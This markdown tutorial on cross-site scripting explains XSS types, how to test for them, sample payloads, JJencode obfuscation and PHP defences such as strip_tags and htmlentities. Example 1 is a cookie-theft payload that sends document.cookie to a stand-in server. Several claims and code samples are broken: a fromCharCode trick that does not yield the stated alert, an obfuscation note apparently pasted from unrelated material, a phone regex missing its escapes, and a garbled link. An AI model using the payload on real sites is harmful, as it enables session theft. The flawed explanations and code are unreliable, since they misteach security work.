# XSS 

## Lexic

* [JavaScript](items/javascript.md)
* [Cookies](items/cookies.md)
* [Web Client](items/web_client.md)
* [Web Server](items/web_server.md)
* [XMLHttpRequest](items/xhr.md)
* [WAF](items/waf.md)
* [Proxy](items/proxy.md)
* [SOP](items/sop.md)
* [HTML](items/html.md)
* [DOM](items/dom.md)

## Nomenclature 
### XSS stands for:
Cross Site Scripting
### Exploitability
Easy / Medium / Difficult according to the context
### Impact : 
Several: `disfigurements, theft of cookie, unauthorized files access, DoS, control victim browser, ` 
# Cross Site Scripting 
-----
## Overview 
The XSS attack is an attack realized when data submit from end user is `interpretted by a browser` through [Javascript](items/javascript.md) language mostly.
It is classified among `injection attacks`.  Early on, it was categorized as **three** kinds, `stored`, `DOM based` and `reflected`. 
* These three types were defined as follows :

  * __Stored XSS__: generally occurs when server stocks submitted data from one user and then this data could be seen by others users : in a message log, in user log, in user credentials, in message form, in user cv.
 
 `Client -> Server -> Users of the site (possibily including attacker)`

  * __Reflected XSS__ : when the user supplied data is automatically replied to the same user without escapping from the server.
 
 `Client -> Server -> Client`

  * __DOM based XSS__ : when the user input is not sent to the server but is used to automatically update its `DOM`.
 
 `Client -> Client`

* This classification was quickly deprecated. To clarify it, the research community proposed two new terms to help organize the types of XSS that can occur :
  * **Server XSS**
  * **Client XSS**

### Server XSS 
---
Server XSS occurs when untrusted data from user is replied with server generated HTML. In this case, the entire vulnerability is in **server-side code**, and the browser is simply rendering the response and executing any valid script embedded within it.

### Client XSS
----
Client XSS occurs when `untrusted data` is used to update the `DOM` with an unsafe call of **client-side script**. 

## How to test for XSS 
* `Graybox` test is the best way to test for XSS. Each HTTP data input and printed after could possibly be an XSS attack vector if the input is not escapped. 
For example this code is vulnerable.
```PHP
    <?php
    echo 'Hello <h1>' .$_GET["name"]. '!</h1>';
    ?>
```
If the value of name is ```</h1><script>alert('xss');</script><h1>``` the browser will get the following answer from the server 
```HTML
    <h1>!</h1>
    <script>alert('xss');</script>
    <h1></h1>
```	


* The best way to perform `black blackbox` XSS test in server is to use a `proxy`, `dirbust` the website and `analyze` all submitted data to the server and inject some HTML characters and analyse the server responses. Submit to check :
  * HTTP headers
  * URL parameters, query string
  * Request body, form data
  * Cookies, API storage 

From all the website submits listed, test with HTML chars (html entities), and look the render in browser. If it is not well escaped (the result is not HTML special character), probably the website is XSS vulnerable.

 
---
## Examples     
### Example 1 : cookie theft 
This code will send the cookie of the user who visit the website containing this payload. 

```HTML
    <img src="nonExistImg" onerror="myFunction()"/>
    <script>function myFunction(){
	window.location = "http://myServer/?cookie".concat("=", document.cookie);
	}
    </script>
```

### Example 2 : XSS with weak js function 

```Javascript
    myFunction(){
	myImg.src = document.getElementById('imgId').value; 
	document.body.appendChild(myImg); 
	}

```
If the user sends ```'); alert('xss'); document.getElement('``` the code will become ```myImg.src = document.getElementById(''); alert('xss'); document.getElementById('imgId').value;```

### Example 3 : Bad escapping
```Javascript
   myFunction(){
	userInputEscapped = userInput.replace('<script>', ' ');
	document.appendChild(userInputEscapped);
	}

```
This function appends to the document body the user input. It replaces the user input containing <script> by " ". 
For example, if a user inputs ```<script>alert("test");</script>``` the result will be ```alert("test");``` and then will not be executed.
This kind of escapping is very unuseful. If the attacker choose ```<SCRIPT>alert('test');</SCRIPT>``` the replace method is case sensitive, so the js script will be executed. 
```Javascript
myFunction(){
	userInputEscapped = userInput.replace('"', ' '); 
	document.body.appendChild(userInputEscapped); 
	}
```
	
In this example the quote char is replaced with ' '. An attacker could attack this implementation by using ```String.fromCharCode(35,120,115,115,34);``` to get ```alert("XSS")```.

### Obfuscation
`Obfuscation` is the deliberate act of creating source or machine code that is difficult for humans to understand. Like obfuscation in natural language, it may use needlessly roundabout expressions to compose statements. Programmers may deliberately obfuscate code to conceal its purpose (security through obscurity) or its logic or implicit values embedded in it, primarily, in order to prevent tampering, deter reverse engineering, or even as a puzzle or recreational challenge for someone reading the source code. This can be done manually or by using an automated tool, the latter being the preferred technique in industry.
#### Example:
Let's assume the following script:
```JavaScript
alert("Hello, JavaScript" );
```
After an obfuscation with [JJencode](http://utf-8.jp/public/jjencode.html); it looks like:
```JavaScript
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:
(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+
($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")
[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_]
[$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"(\\\"\\"+$.__$+$.__$+$.___+$.$$$_+
(![]+"")[$._$_]+(![]+"")[$._$_]+$._$+",\\"+$.$__+$.___+"\\"+$.__$+$.__$+$._$_+$.$_$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+"
\\"+$.__$+$._$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"
\\\"\\"+$.$__+$.___+")"+"\"")())();
```
Note : Note that the **ENCODED** above does not appear in encoded files, rather it is the location where the encoded 
host code would appear. Also note that this algorithm does not work in direct mode (that is, putting it in a .js won’t 
work) because it requires a feature that was introduced in HTML 4.0. As a result, it must appear in an HTML page, and that HTML page must declare its need for HTML 4.0 or later using a declaration like this:
```<!DOCTYPE html PUBLIC “-//W3C//DTD HTML 4.0//EN”>```
The **HTML 4.0** 4.0’ string can be replaced by later versions, such as ‘HTML 4.1’ or ‘XHTML 1.0’, etc.

## Counter Measures
* **Rule #1**: **NEVER** trust client. Always perform `input validation` at every single posted by the user to the server. This includes `escaping`, `filtering` and checking everything related to data submit.
* **Rule #2**: Always update `plugins`, `modules`, `core` and all plugged packaged being used in web systems. Indeed, this contributes in limiting XSS flaws risks. This requires mastering and knowing each item used in the system/web site.
* **Rule #3**: `Disable`/`remove` unuseful features/modules cause `more one's web site embeds packages, higher is the risk of XSS vulnerability presence` mostly in CMSs.
* **Rule #4**: Think of using a [WAF](items/waf.md) and think of `deofuscation` methods.
* **Rule #5**: Implement [SOP](items/sop.md) policy `properly`.
 

 Now let's pick up some server side programming languages for more `accurate ` counter measures implementations.
These counter measures are : 
### Data Validation 
Data validation is the process of ensuring that the application is running with correct data. For example if the program expects an integer for user input, then any other type of data would be discared.
`Every piece of user data must be validated when it is received(at the server side)`.

### Data sanitization 
Data sanitazion focuses on manipulating the data `to make sure it is safe `by removing any unwanted bits from the data and normalizing it to the correct form. For example if the application is expecting a plain text string as user input, any html markup should be removed.

### Output escaping 
To protect the integrity of displayed/output data, `the data should be escaped` when presenting to the user. This prevent browser from applying any unintended meaning to any special sequence of characters that may be found.

-----
### PHP
Let's take the following example: 
```html 
        <form action="poste.php" method="post">
                <input type="text" name="myComment">
                <input type="submit" name="sbmit" value="Submit">
        </form>
```

Above a simple form witch submits data through `POST` method to `poste.php` for processing.
The `poste.php` process data as follow :
```php 
        <?php
        	echo $_POST["myComment"];
	?>
```
This code is xss vulnerable. To make it security solid wich prevents XSS attacks, we should be mindfull of `data validation, data sanitazion, and output escaping`.

1. Data validation
The way to validate the data is to define a kind of whitelist for each user input.
This could be perfomed with regular expression in php.
For example for US phone number validation, the code will be :

```php 
        <?php
		// validate a US phone number
		if (preg_match('/^((1-)?d{3}-)d{3}-d{4}$/', $phone)) {
			echo $phone . " is valid format.";
        }
	?>
```
Tutorials for regular exression could be found [here](https://openclassrooms.com/courses/concevez-votre-site-web-avec-php-et-mysql/les-expressions-regulieres-partie-1-2)


2. Data sanitization
* PHP `strip_tag : string strip_tags ( string $str [, string $allowable_tags ] )`
This function tries to return a string with all NULL bytes, HTML and PHP tags stripped from a given str.

```php
        <?php
		// sanitize HTML from the myComment content
		$comment = strip_tags($_POST["myComment"]);
	?>
```
`Warning
This function does not modify any attributes on the tags that you allow using allowable_tags, including the style and onmouseover attributes that a mischievous user may abuse when posting text that will be shown to other users.`

* PHP `filter_var()` Functiona
The `filter_var() : https://www.w3schools.comhp_f` function both validate and sanitize data.It filters a single variable with a specified filter.
The following example uses this function to remove all HTML tags from a string:
```php
        <?php
		$str = "<h1>Hello World!</h1>";
		$newstr = filter_var($str, FILTER_SANITIZE_STRING);
		echo $newstr;
	?>
```
[Here](https://www.w3schools.com/php/php_filter.asp) for more informations about filters.



3. Output escaping
Convert the predefined characters "<" (less than) and ">" (greater than) to HTML entities:

`String htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get("default_charset") [, bool $double_encode = TRUE ]]] )`

```php
        <?php
		// escape output sent to the browser
		$str = "A 'quote' is <b>bold</b>";

		// Outputs: A 'quote' is &lt;b&gt;bold&lt;/b&gt;
		echo htmlentities($str);
	?>
```
----
## Java implementation 

1. Data validation


-----
 
 ### ASP.Net
 -----
 
 ### C#
 -----
[Content](items/c_sharp_counter_measures.md)


 ### Java
 -----
 
 ### Node.JS
 -----
 
 ### Python
 -----
 [Content](items/python_counter_measures.md)
 
